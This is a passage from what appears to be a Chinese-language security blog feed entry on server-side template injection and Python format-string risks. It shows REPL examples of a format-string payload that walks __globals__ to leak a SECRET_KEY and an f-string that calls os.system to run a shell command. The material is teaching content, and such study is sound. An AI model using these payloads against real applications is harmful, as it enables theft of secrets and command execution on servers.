class="hljs-meta prompt_">...</span> <span class="language-python"> <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">  <span class="hljs-variable language_">self</span>.name = name</span><br><span class="hljs-meta prompt_">...</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">user = User(<span class="hljs-string">&#x27;joe&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;&#123;0.__class__.__init__.__globals__[config]&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(user)</span><br>&quot;&#123;&#x27;SECRET_KEY&#x27;: &#x27;12345&#x27;&#125;&quot;<br></code></pre></td></tr></table></figure><p>如果用来格式化的字符串可以被控制，攻击者就可以通过注入特殊变量，带出敏感数据。</p><ol start="4"><li><strong>f-Strings</strong></li></ol><p>这是python3.6之后新增的一种格式化字符串方式，其功能十分强大，可以执行字符串中包含的python表达式，安全隐患可想而知。</p><figure class="highlight python-repl"><table><tr><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a , b = <span class="hljs-number">5</span> , <span class="hljs-number">10</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">f&#x27;Five plus ten is <span class="hljs-subst">&#123;a + b&#125;</span> and not <span class="hljs-subst">&#123;<span class="hljs-number">2</span> * (a + b)&#125;</span>.&#x27;</span></span><br>&#x27;Five plus ten is 15 and not 30.&#x27;<br><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;id&quot;</span>)&#125;</span>&#x27;</span></span><br>uid=0(root) gid=0(root) groups=0(root)<br>&#x27;0&#x27;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SSTI注入&quot;&gt;&lt;a href=&quot;#SSTI注入&quot; class=&quot;headerlink&quot; title=&quot;SSTI注入&quot;&gt;&lt;/a&gt;SSTI注入&lt;/h1&gt;&lt;p&gt;SSTI（Server Side Template Injection，服务器端模板注入）：服务端接收攻击者</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
</feed>
